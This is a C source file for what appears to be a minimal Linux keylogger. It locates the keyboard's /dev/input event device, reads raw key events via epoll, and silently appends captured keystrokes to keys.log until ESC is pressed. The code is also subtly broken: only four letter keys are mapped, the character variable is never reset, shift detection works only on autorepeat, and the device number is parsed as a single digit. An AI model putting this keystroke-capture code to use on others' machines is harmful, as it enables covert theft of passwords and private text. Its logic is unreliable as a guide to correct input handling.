#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <linux/input.h>

#include "logkeys.h"

static int get_kbd_eventid();
static void log_keys(int epfd, int kbd_fd, FILE *logfp);

int main(int argc, char const *argv[]) {

    int kbd_event_id = get_kbd_eventid();
    char kbd_event_file[64];
    memset(kbd_event_file, 0, sizeof(kbd_event_file));
    sprintf(kbd_event_file, "%s/event%d", EVENT_PATH_PREFIX, kbd_event_id);

    int kbd_fd = open(kbd_event_file, O_RDONLY);
    if (kbd_fd < 0) {
        perror("open kbd_event_file failed");
        return -1;
    }

    int epfd = epoll_create1(0);
    if (epfd < 0) {
        perror("epoll_create1 failed");
        return -1;
    }

    struct epoll_event ev1 = {.data.fd = kbd_fd, .events = EPOLLIN};
    int err = epoll_ctl(epfd, EPOLL_CTL_ADD, kbd_fd, &ev1);
    if (err == -1) {
        perror("epoll_ctl failed");
        return -1;
    }

    FILE *logfp = fopen("keys.log", "w");
    log_keys(epfd, kbd_fd, logfp);
    fclose(logfp);

    close(kbd_fd);
    close(epfd);
    return 0;
}

static int get_kbd_eventid() {
    FILE *devfp = fopen("/proc/bus/input/devices", "r");
    if (devfp == NULL) {
        return -1;
    }

    int found = 0;
    char *line = NULL;
    size_t n = 0;
    char *event = NULL;
    while (getline(&line, &n, devfp) != -1) {
        if (!found && strstr(line, "keyboard") != NULL) {
            found = 1;
        } else if (found) {
            event = strstr(line, "event");
        }
        free(line);
        line = NULL;
        n = 0;
        if (event)
            break;
    }

    fclose(devfp);
    if (event == NULL) {
        return -1;
    }

    return event[5] - '0';
}

static void log_keys(int epfd, int kbd_fd, FILE *logfp) {
    char buf[64];
    char ch = 0;
    int i = 0;

    int hold_shift = 0;
    int quit = 0;

    struct input_event input_event;
    struct epoll_event ev;
    ssize_t len = 0;

    memset(buf, 0, 64);

    while (!quit) {
        int err = epoll_wait(epfd, &ev, 1, -1);
        if (err == -1) {
            perror("epoll_wait failed");
            return;
        }

        if (ev.data.fd != kbd_fd) {
            perror("epoll_wait failed, not kbd_fd");
            return;
        }

        len = read(kbd_fd, &input_event, sizeof(input_event));
        if (len != sizeof(input_event)) {
            perror("read failed");
            return;
        }

        if (input_event.type != EV_KEY)
            continue;

        if (input_event.code == KEY_LEFTSHIFT ||
            input_event.code == KEY_RIGHTSHIFT) {
            if (input_event.value == 2)
                hold_shift = 1;
            else
                hold_shift = 0;
            continue;
        }

        if (input_event.value == 1) {
            switch (input_event.code) {
            case KEY_Q:
                ch = 'q';
                break;
            case KEY_W:
                ch = 'w';
                break;
            case KEY_E:
                ch = 'e';
                break;
            case KEY_R:
                ch = 'r';
                break;
            case KEY_ESC:
                quit = 1;
                break;
            }
            if (hold_shift && isalnum(ch))
                ch = toupper(ch);

            if (ch == 0)
                continue;
            buf[i] = ch;
            printf("%s\n", buf);
            if (ch == '\n' || i == 63 || quit) {
                fprintf(logfp, "%s", buf);
                memset(buf, 0, 64);
                i = 0;
            }
            i += 1;
        }
    }

    fflush(logfp);
}